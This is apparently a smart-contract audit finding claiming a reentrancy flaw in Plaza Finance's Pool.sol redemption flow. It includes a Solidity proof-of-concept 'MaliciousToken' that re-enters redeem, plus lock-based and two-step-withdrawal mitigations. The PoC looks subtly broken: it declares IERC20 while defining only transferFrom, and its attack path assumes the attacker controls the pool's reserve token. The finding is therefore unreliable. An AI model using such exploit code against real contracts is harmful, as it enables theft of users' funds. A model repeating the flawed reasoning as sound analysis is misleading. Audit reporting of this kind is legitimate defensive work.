# Malicious token contract will drain all reserve tokens from liquidity providers

### Summary

A missing state lock in the redemption flow will cause a complete loss of funds for liquidity providers as an attacker will exploit reentrancy vulnerabilities in the token transfer callbacks to perform multiple redemptions with the same tokens.

### Root Cause

In [Pool.sol#383-414](https://github.com/sherlock-audit/2024-12-plaza-finance/blob/main/plaza-evm/src/Pool.sol#L383-L414) the redemption function performs token burns before external transfers without proper state locks, allowing for potential reentrancy attacks through malicious token contracts.

### Internal Pre-conditions

1. Pool contract needs to have sufficient reserve tokens for redemptions
2. Pool contract must be actively accepting redemptions (not paused)
3. Attacker needs to have enough tokens to initiate at least one redemption

### External Pre-conditions

1. The reserve token contract must be a malicious implementation that includes callback functionality
2. Network gas prices need to be within profitable range for multiple transactions

### Attack Path

1. Attacker deploys a malicious token contract that implements the ERC20 interface with custom transfer logic
2. Attacker acquires legitimate pool tokens through normal means
3. Attacker initiates a redemption with their tokens
4. During the reserve token transfer, the malicious token contract's callback is triggered
5. The callback re-enters the pool contract through a different redemption call
6. The second redemption executes before the first one completes
7. Steps 4-6 can be repeated until the pool is drained or gas limits are reached

### Impact

The pool suffers a complete loss of reserve tokens proportional to the number of successful reentrancy loops. The attacker gains multiple redemptions worth of reserve tokens while only spending tokens once. In a worst-case scenario, this could drain the entire pool's reserves.

```solidity

pragma solidity ^0.8.0;

import "./Pool.sol";

contract MaliciousToken is IERC20 {
    Pool public pool;
    uint256 public attackCount;
    uint256 public constant ATTACK_ROUNDS = 5;

    constructor(address _pool) {
        pool = Pool(_pool);
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        if (attackCount < ATTACK_ROUNDS) {
            attackCount++;
            // Malicious reentry
            pool.redeem(
                Pool.TokenType.BOND,
                amount,
                0,
                block.timestamp,
                address(this)
            );
        }
        return true;
    }

    // Test function
    function attack(uint256 amount) external {
        attackCount = 0;
        pool.redeem(
            Pool.TokenType.BOND,
            amount,
            0,
            block.timestamp,
            address(this)
        );
    }
}
```

### Mitigation

1. Implement strict state locks for redemption operations:
```solidity
bool private _isRedeeming;

modifier nonReentrantRedeem() {
    require(!_isRedeeming, "Reentrant redemption");
    _isRedeeming = true;
    _;
    _isRedeeming = false;
}

function redeem(...) external nonReentrant nonReentrantRedeem {
    // Existing redemption logic
}
```

2. Implement a two-step withdrawal pattern where redemptions are claimed in a separate transaction:
```solidity
mapping(address => uint256) public pendingRedemptions;

function requestRedemption(uint256 amount) external nonReentrant {
    _burn(msg.sender, amount);
    pendingRedemptions[msg.sender] += calculateReserveAmount(amount);
}

function claimRedemption() external {
    uint256 amount = pendingRedemptions[msg.sender];
    require(amount > 0, "No pending redemption");
    pendingRedemptions[msg.sender] = 0;
    SafeERC20.safeTransfer(reserveToken, msg.sender, amount);
}
```
